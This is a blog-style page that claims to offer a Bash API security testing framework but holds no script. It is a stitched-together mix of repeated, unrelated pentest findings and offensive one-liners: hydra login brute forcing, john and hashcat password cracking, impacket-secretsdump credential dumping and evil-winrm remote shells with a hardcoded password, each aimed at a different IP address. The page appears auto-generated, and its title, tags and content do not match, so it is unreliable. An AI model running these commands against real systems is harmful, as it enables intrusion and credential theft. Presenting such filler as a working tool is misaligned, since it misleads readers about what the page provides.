---
TitleSEO: "API Security Testing Framework in Bash | ZureFX"
TitlePost: "API Security Testing Framework — Bash"
Author: "ZureFX"
Description: "A Bash script for api security testing framework. Built for security research and automation."
Keywords: "scanner, parser, automation, rust, c, bash"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-393.html"
URL_IMAGES: ""
Date: "2024-04-14"
Tags: "Scanner, Parser, Automation, Rust, C, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-393"
Permalink: "/scripting/script-api-security-testing-framework-393.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `pwncat`
- `smbclient`
- `nmap`

## Implementation

### Core Logic

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
crackmapexec smb 10.92.157.52 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.48.88 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.233.224/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.174.155
nmap -sCV -p80,8888,80 10.81.40.239 -oN scan.txt
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.250.250/FUZZ
evil-winrm -i 10.119.219.35 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.170.19 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.13.97.56 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 19.09s
```
